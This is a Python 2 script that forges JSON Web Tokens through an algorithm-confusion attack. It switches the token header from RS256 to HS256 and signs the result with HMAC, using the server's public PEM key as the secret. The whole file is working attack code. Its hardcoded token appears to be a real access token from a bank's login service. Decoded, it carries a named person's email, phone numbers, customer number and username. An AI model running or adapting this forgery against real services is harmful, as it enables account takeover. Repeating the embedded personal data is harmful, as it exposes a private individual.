import base64
import json
import subprocess
import binascii

print("")
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InEzZTl5bENoUzNXSS1vb0RjS2JTX1VXWmphTE1yd2VwTERYb1F6Um1RcXcifQ.eyJkb21haW4iOiJwZXJzb25hc2JldGEuYmFuaXN0bW8uY29tIiwiQ0lTIjoiOTg3NDM3MDEiLCJlbWFpbCI6WyJYQ0FSUkVSQUBHTUFJTC5DT00iXSwiaG9tZV9waG9uZV9udW1iZXIiOlsiNjk4MTYyOTEiXSwibmFtZSI6IkpBVklFUiBBTEJFUlRPIENBUlJFUkEgTUFRVUVOWklFIiwiZmlyc3RfbmFtZSI6IkpBVklFUiIsIm1pZGRsZV9uYW1lIjoiQUxCRVJUTyIsImxhc3RfbmFtZSI6IkNBUlJFUkEgTUFRVUVOWklFIiwicGhvbmVfbnVtYmVyIjpbIjY5ODE2MjkxIl0sInRva2VuX3R5cGUiOiJBQ0NFU1NfVE9LRU4iLCJpYXQiOjE1Nzk1NTg0MzYsImV4cCI6MTU3OTU1OTAzNiwiYXVkIjoic3ZwIiwiaXNzIjoiaHR0cHM6Ly9hcGkuYmFuaXN0bW8uY29tL3NlY3VyaXR5djIvT0lEQyIsInN1YiI6ImpjYXJyZXJhODEiLCJqdGkiOiIzYTUyOGRmOC1jYmM2LTRhMTEtOWYxYy1jNGM1MjFhMjBhMDQifQ.hudl1Y-u4xvNCGRAMP3Qw0PzVb4NUNqiUlivHtKgZslWxEyXD8BUyXK2uTVvnnTbDu2V1A51Tm82qMOZQW-nythGlvp18E077FATEQxADbWIL_4ARQsKWOe-AKefJthiVL0V0M9SiMzOWKjM1IgbfwU5d4_85KDmszZPDffZoZissxVa4fCPoFfpCTSP81xRJ1jS5W2YeR9ElladNpYM5Miu5BcHo0LJaV-sMZJ-WyHw8uQ5CJsozhCfR8toyA1iIometiSkXJBMKeUhPthrDW4I8KLBKPRcE2UFkB1PM63xCacnq0AMV8-U9X1MQXoVcKw4DJV-OTA4O_oC3dbqlQ"
algo = base64.b64decode(token.split(".")[0]+"==")
data = base64.b64decode(token.split(".")[1]+"==")
print "\n[+] JWT Token "
print token
print "\n[+] Algorithm "
print algo
print "\n[+] Data"
print data

# cat file.pem | xxd -p | tr -d "\\n"
pem = "/Users/Documents/public.pem"
pem_command = 'cat :file | xxd -p | tr -d "\\\\n"'.replace(":file", pem)
print "\n[+] PEM command: "
print pem_command

p1 = subprocess.Popen(['cat', pem], stdout=subprocess.PIPE)
p2 = subprocess.Popen(['xxd','-p'], stdin=p1.stdout, stdout=subprocess.PIPE)
p3 = subprocess.Popen(['tr','-d','\\\\n'], stdin=p2.stdout, stdout=subprocess.PIPE)
pem_hex = "".join(p3.communicate()[0].splitlines())

print "\n[+] PEM hex output: "
print pem_hex


json_algo = json.loads(algo)
json_data = json.loads(data)
print "\n[+] JWT Token Algorithm "
print json_algo["alg"]

json_algo["alg"] = "HS256"
print "\n[+] Tampered JWT Token Algorithm "
print json_algo["alg"]
tamp_algo = base64.b64encode(json.dumps(json_algo))
print "\n[+] Tampered JWT Token Base64 Algorithm "
print tamp_algo

old = json_data
#old["name"] = "Other"
json_data = old
print "\n[+] Tampered JWT Token Data "
print json_data
tamp_data = base64.b64encode(json.dumps(json_data)).replace("=","")
print "\n[+] Tampered JWT Token Base64 Data "
print tamp_data

# echo -n "token" | openssl dgst -sha256 -mac HMAC -macopt hexkey:-key-
tamperedToken = tamp_algo+"."+tamp_data
p1 = subprocess.Popen(['echo', '-n', tamperedToken], stdout=subprocess.PIPE)
p2 = subprocess.Popen(['openssl','dgst','-sha256','-mac', 'HMAC', '-macopt', 'hexkey:'+pem_hex], stdin=p1.stdout, stdout=subprocess.PIPE)
signature = p2.communicate()[0].strip()
print "\n[+] Tampered JWT Token Hex Signature "
print signature

tamp_sign = base64.urlsafe_b64encode(binascii.a2b_hex(signature)).replace('=','')
print "\n[+] Tampered JWT Token Signature "
print tamp_sign


print "\n[+] Tampered Token"
print tamp_algo+"."+tamp_data+"."+tamp_sign
